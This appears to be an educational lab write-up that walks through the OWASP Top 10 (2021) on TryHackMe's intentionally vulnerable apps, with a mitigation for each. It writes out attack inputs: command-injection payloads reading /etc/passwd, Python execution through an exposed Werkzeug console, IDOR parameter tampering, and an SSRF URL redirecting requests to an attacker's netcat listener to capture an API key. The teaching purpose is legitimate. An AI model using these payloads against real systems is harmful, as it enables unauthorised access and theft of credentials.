**DISCLAIMER:** This project is for ***educational purposes only***. All attacks were performed in a controlled lab environment on intentionally vulnerable web applications. Never use these techniques on unauthorized networks or systems.
<br><br>

The OWASP Top Ten is a widely recognized list that outlines the most critical security risks to web applications. These vulnerabilities (in 2021 version) are:
<br><br>

![image](https://github.com/user-attachments/assets/b8fb34de-edcb-4f75-8256-cdfb8ecb91b6)

*Image source: evalian.co.uk*
<br><br>

Here we will demonstrate and exploit each of these vulnerabilities one by one on TryHackMe's OWASP Top 10 - 2021 lab (https://tryhackme.com/room/owasptop102021).
<br><br>

**1) Broken Access Control**

This occurs when applications fail to properly enforce user permissions, allowing attackers to access unauthorized resources or perform restricted actions.

Example:

Here we have IDOR (Insecure Direct Object Reference) which is a vulnerability that exposes direct references to objects which can be modified by users.

First we login as a normal user.

![image](https://github.com/user-attachments/assets/d75fbd8b-10e3-49b7-aad4-89428235aa25)

![image](https://github.com/user-attachments/assets/2911e20f-8e31-420c-bb35-ff87b52d32b1)

We try modifying the 'note_id' GET parameter in the URL and change it from 1 to 2.

![image](https://github.com/user-attachments/assets/c82f967b-acc2-4a68-98c3-9acb4e5c6362)

And now we can access the account of some other user! 

We can use burpsuite's intruder feature to brute force possible 'note_id' values in a range and check the output.
<br><br>

Mitigation: Use role-based access control, enforce permissions on the server side, restrict access to sensitive files and endpoints, apply the principle of least privilege.
<br><br>

**2) Cryptographic Failures**

These involve weak or missing encryption of sensitive data, such as passwords stored in plaintext or data transmitted over unencrypted channels.

Example: 

![image](https://github.com/user-attachments/assets/541a0831-00ae-427a-9ca0-e4f076098c91)

We check the /login.php page's source code and find a comment which mentions of /assets directory. This is an exposure flaw.

![image](https://github.com/user-attachments/assets/c13ee809-086b-4b61-8c6d-f668a09afe5b)

/assets page has webapp.db file which is a flat file database. We download this.

![image](https://github.com/user-attachments/assets/618621a2-eb4a-4931-93ec-e9a1ce4d711f)

Using sqlite3 to query the DB.

![image](https://github.com/user-attachments/assets/584dbbf3-1662-412d-aa85-152a6cc42a28)

We get the password hashes of various users. We'll take the admin user hash. Using hash-identifier to find the hash algorithm.

![image](https://github.com/user-attachments/assets/436b8d75-43ea-4ee0-8a55-c0254d6277b5)

It's md5 which is a very insecure algorithm and can be cracked easily. This is the cryptograhic failure.
Using johntheripper to crack this hash.

![image](https://github.com/user-attachments/assets/f8ddf736-1b4e-4ce9-b822-e643b3416437)

And we have the plaintext password which is 'qwertyuiop'. Use this password for login as admin.

![image](https://github.com/user-attachments/assets/97d77c1c-fa64-427a-9722-c72c4564c8f4)
<br><br>

Mitigation: Use strong encryption algorithms like AES, hash passwords securely using bcrypt or Argon2, avoid storing sensitive data unless necessary, ensure proper key management practices.
<br><br>

**3) Injections**

Occurs when user input is interpreted as a command or query, leading to unauthorized access or data manipulation. Injections can be with SQL, OS commands, XMl, LDAP.... Here we will look at OS commands injection simply called as Command Injection.

Example:

![image](https://github.com/user-attachments/assets/253a8971-baaa-4e62-9de9-5eca73c1cb61)

Assuming that the input field directly places out input in a command executed on linux shell, we can try linux commands with seperators like ; or | to escape the rest of the command.

![image](https://github.com/user-attachments/assets/8b5718ac-4881-475b-b3f8-c2e39214bfcd)

Using *;id* worked and gave us current user information. Now trying *| cat /etc/passwd* to print all users.

![image](https://github.com/user-attachments/assets/96a28329-b6b4-4b82-a48e-00d95e6173e6)

We can use burpsuite's repeater to try various input and see which ones work.
<br><br>

Mitigation: Use parameterized queries and prepared statements, validate and sanitize user input strictly, avoid constructing queries directly from input, use allowlists wherever possible.
<br><br>

**4) Insecure Design**

Refers to fundamental flaws in application architecture, such as missing security controls or logic that can be abused by attackers.

Example:

This application also has a design flaw in its password reset mechanism. The security question "What's your favourite colour ?" used for user verification can be easily guessed.

![image](https://github.com/user-attachments/assets/cad99e8e-5637-4475-9fc3-90f2eb440b0c)

![image](https://github.com/user-attachments/assets/c4415fff-df79-41e4-9fc6-7d80aee2182d)

![image](https://github.com/user-attachments/assets/b609312b-54c0-40d0-a0fd-f4c8ae19e78c)

The answer is *green* here. It's case sensitive. Now we got the reset password for the user *joseph*.

![image](https://github.com/user-attachments/assets/69f9cedc-037f-4d84-b611-a07aa4aa00d8)
<br><br>

Mitigation: Conduct threat modeling and design reviews, implement secure design patterns, enforce proper business logic on both client and server sides, integrate security into the software development lifecycle.
<br><br>

**5) Security Misconfiguration**

Arises from incorrect settings, enabled defaults, unnecessary features or verbose error messages that expose internal information.

Example:

A common misconfiguration is exposure of debugging features on the frontend. Here we have an open debug interface for a Werkzeug console. Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed via URL on /console. In this console we can execute python codes on the server's system.

![image](https://github.com/user-attachments/assets/d4b04f94-f67f-48e5-83aa-26c2242d887c)

![image](https://github.com/user-attachments/assets/4de57ab0-914b-4c7f-9d4f-34fc39ab1ac4)

Writing *import os; print(os.popen("ls -l").read())* in the console.

![image](https://github.com/user-attachments/assets/23af3747-2d8e-470f-aff5-8f728d0064c5)

The python code executed successfully.
<br><br>

Mitigation: Disable unused features and services, configure security headers, apply least privilege configurations, keep software updated, and regularly audit and harden system configurations.
<br><br>

**6) Vulnerable and Outdated Components**

Using outdated libraries, frameworks or software components with known vulnerabilities can expose the application to exploits including third-party softwares.

Example:

Here we have a vulnerable online book store.

![image](https://github.com/user-attachments/assets/a29c04cc-0acc-4809-97da-a9f84cf75124)

Searching for exploits on ExploitDB. You can also use SearchSploit.

![image](https://github.com/user-attachments/assets/38ad2601-11af-4c85-a74c-c0969957d547)

![image](https://github.com/user-attachments/assets/735b4453-fe26-4fb6-9248-39aea1247183)

Using this exploit and we have achieved remote code execution on the website's server OS.

![image](https://github.com/user-attachments/assets/938609e7-4c0d-41b8-ab71-f620f30dbfed)
<br><br>

Mitigation: Regularly update all components, monitor dependencies for security advisories, use automated tools for vulnerability scanning, maintain a software bill of materials.
<br><br>

**7) Identification and Authentication Failures**

Weak login systems, predictable credentials, poor session handling can allow attackers to compromise accounts or impersonate users.

Example:

We will look at vulnerability called "Re-Registration of an Existing User" which occurs when the developer fails to properly normalize, sanitize or validate usernames during registration or login. This means the application may treat "admin" and " admin" (with a leading space) as different user. But due to backend logic bugs it links this new user to the admin's privileges or it retrieves content meant for admin when <br>
" admin" logs in.

![image](https://github.com/user-attachments/assets/89fc623c-cfa5-4917-9ca5-9f57b1a7b637)

We try to register with username as "darren".

![image](https://github.com/user-attachments/assets/9a98c6ec-2c30-4d39-8634-a18f6528be50)

![image](https://github.com/user-attachments/assets/5a4327d0-e54e-43d8-b40a-12204c0de701)

Username already exists. Now we try registering with username " darren" (with leading space) and it works.

![image](https://github.com/user-attachments/assets/15e13ff1-7804-4adc-b6a7-321c134e3b8b)

![image](https://github.com/user-attachments/assets/cf2fe192-6f44-4ba6-829e-83249b8fc6b0)

Now if we login with " darren", we see that this new user is linked to "darren".

![image](https://github.com/user-attachments/assets/894bae6b-260f-44e1-91cd-1ec72331a8ef)

![image](https://github.com/user-attachments/assets/36912b8e-dd43-4650-ac77-6e197821a3aa)
<br><br>

Mitigation: Implement multi-factor authentication, use strong and securely stored passwords, enforce account lockout after repeated failures, secure session management using tokens and cookies with proper attributes.
<br><br>

**8) Software and Data Integrity Failures** 

Involves trusting software, updates, or data sources without ensuring their integrity, leading to supply chain attacks or injection of malicious code.

Example: 

The SolarWinds Attack, 2020 is a classic example of supply chain attack due to integrity failure. Attackers infiltrated SolarWinds’ build environment and injected malicious code into a legitimate product (Orion software). This malicious update was distributed to over 18,000 customers, including U.S. government agencies and Fortune 500 companies. Once installed, the malware established a covert C2 channel and enabled further exploitation, such as credential theft and lateral movement.

The attack succeeded largely because of a lack of proper integrity validation mechanisms in the software development and deployment pipeline.

More details: https://www.techtarget.com/whatis/feature/SolarWinds-hack-explained-Everything-you-need-to-know
<br><br>

Mitigation: Use signed packages, secure and monitor CI/CD pipelines, verify third-party components before use, ensure all code and data changes are validated and authorized.
<br><br>

**9) Security Logging and Monitoring Failures**

Lack of logging, insufficient monitoring, or ineffective alerting can allow attackers to operate undetected for extended periods.

Example:

Here we have a sample log file which stores login attempts on a web application.

![image](https://github.com/user-attachments/assets/86bff3dc-a71b-40e0-8014-baabe886f82f)

We can see multiple failed login attempts from the same IP address: *49.99.13.16*. This is a brute force/password spray attack. We should block this IP immediately. However, if there wasn't proper logging or monitoring, the attack may go undetected and the attacker may succeed with their goal.
<br><br>

Mitigation: Enable detailed logging of security-related events, secure log storage, use centralized log management systems or SIEM tools, configure real-time alerts for suspicious activities.
<br><br>

**10)  Server-Side Request Forgery (SSRF)**

Occurs when an attacker tricks the server into making requests to internal or external systems, potentially exposing sensitive data or infrastructure.

Example:

![image](https://github.com/user-attachments/assets/6b4062a8-d6be-4f79-bb06-b5f288e6bbcf)

Clicking on the 'Download Resume' link downloads a file from the URL:<br>

*http://10.10.132.150:8087/download?server=secure-file-storage.com:8087&id=75482342* <br>

In this URL, the web application makes a server-side request to another resource, based on the 'server' GET parameter. An attacker can modify this parameter to their own IP and the web application would forward the request to the attacker instead of the file server. As part of the forwarded message, the attacker may obtain sensitive information like the API key.

We will open a listener on our machine on port 1234 with netcat.

![image](https://github.com/user-attachments/assets/a80f924f-9429-4b7e-9eee-cc40a5304b6e)

Then modify the 'server' parameter in the URL to our own IP and listening port:<br>

*http://10.10.132.150:8087/download?server=10.17.20.68:1234&id=75482342* <br>

We run this URL in our browser and the web server forwards the request to us which includes an API key.

![image](https://github.com/user-attachments/assets/46335ac6-cc02-48ed-9068-5434ff32d430)
<br><br>

Mitigation: Validate and sanitize all user-supplied URLs, block internal IP ranges at the application and network level, use firewalls to restrict outbound requests, disable unnecessary URL fetches from user input.
<br><br><br>

***THE END***






